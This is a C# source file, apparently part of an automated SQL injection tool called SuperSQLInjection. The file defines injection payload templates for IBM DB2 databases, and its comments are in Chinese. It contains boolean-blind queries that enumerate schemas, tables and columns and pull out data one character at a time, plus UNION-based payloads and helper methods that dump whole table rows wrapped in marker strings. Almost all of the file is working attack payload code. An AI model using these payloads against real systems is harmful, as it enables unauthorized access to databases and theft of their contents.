using System;
using System.Collections.Generic;
using System.Text;
using tools;

namespace SuperSQLInjection.payload
{
    class DB2
    {
        //加载对应配置(需要读取的环境变量)
        public static String path = "config/vers/db2.txt";
        public static List<String> vers = FileTool.readFileToList(path);

        //数据库数量
        public static String dbs_count = "(select count(1) from sysibm.sysschemata)";
        //表数量
        public static String tables_count = "(select count(1) from sysibm.systables where creator='{dbname}')";
        //列数量
        public static String columns_count = "(select count(1) from sysibm.syscolumns where tbcreator='{dbname}' and tbname='{table}')";


        //获取数据库名
        public static String db_value = "(select name from (select name,rownumber() over() rownum from sysibm.sysschemata) t where t.rownum={index})";
        //获取表名称
        public static String table_value = "(select name from (select name,rownumber() over() rownum from sysibm.systables where creator='{dbname}') t where t.rownum={index})";
        //获取列名称
        public static String column_value = "(select name from (select name,rownumber() over() rownum from sysibm.syscolumns where tbcreator='{dbname}' and tbname='{table}') t where t.rownum={index})";


        //获取数据库数量bool方式
        public static String bool_db_count = " " + dbs_count + ">{len}";
        //获取表数量bool
        public static String bool_tables_count = " " + tables_count + ">{len}";
        //获取列数量bool
        public static String bool_columns_count = " " + columns_count + ">{len}";
        


        public static String substr = "substr(({data})),{index},1)";
        //多字节
        public static String hex_value = "hex({data})";
        
        //bool方式字符长度判断
        public static String bool_length = " length(rtrim(({data})))>{len}";

        //bool方式获取值
        public static String bool_value = " ascii(substr({data},{index},1))>{len}";

        public static String cast_value = "coalesce(rtrim(cast({data} as char(254))),chr(32))";

        //获取行数据
        public static String data_value = "(select "+ cast_value + " from (select {allcolumns},rownumber() over() rownum from {dbname}.{table}) t where t.rownum={index})";

        //获取行数据
        public static String data_no_cast_value = "(select {data} from (select {allcolumns},rownumber() over() rownum from {dbname}.{table}) t where t.rownum={index})";


        //union获取数据条数
        public static String data_count = "(select count(1) from {dbname}.{table})";

        public static String bool_datas_count = " " + data_count + ">={len}";

        //union获取值
        public static String union_value = " 1=2 union all select {data} from sysibm.sysdummy1";
       
        public static String getUnionDataValue(String unionFileTemplate, String dataPayLoad, String dbname, String table, String index)
        {
            String temlate=unionFileTemplate.Replace("{data}", "(chr(94)||chr(94)||chr(33)||" + cast_value.Replace("{data}", dataPayLoad.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index)) + "||chr(33)||chr(94)||chr(94))");
            return union_value.Replace("{data}", temlate);
        }

        public static String unionColumns(List<String> columns, String unionStr)
        {
            StringBuilder sb = new StringBuilder();
            foreach (String column in columns)
            {
                sb.Append(cast_value.Replace("{data}", column) + unionStr);
            }
            sb.Remove(sb.Length - unionStr.Length, unionStr.Length);
            return sb.ToString();
        }

        public static String getUnionDataValue(String unionFileTemplate, List<String> columns, String dbname, String table, String index)
        {
           String data = "chr(94)||chr(94)||chr(33)||" + unionColumns(columns,"||chr(36)||chr(36)||chr(36)||") + "||chr(33)||chr(94)||chr(94)";
           String template= unionFileTemplate.Replace("{data}", (data_no_cast_value.Replace("{data}", data).Replace("{allcolumns}", Comm.unionColumns(columns, ",")).Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index)));  
            return union_value.Replace("{data}", template);
        }

        /// <summary>
        /// 获得bool方式值payload
        /// </summary>
        /// <param name="dataStr">对应值的查询SQL</param>
        /// <param name="dbName">数据库名</param>
        /// <param name="table">表名</param>
        /// <param name="index">下标</param>
        /// <returns></returns>
        public static String getBoolDataPayLoad(String column, String dbName, String table, int index)
        {
            String payload = data_value.Replace("{data}", column).Replace("{allcolumns}", column).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index.ToString());
            return payload;
        }
    }
}
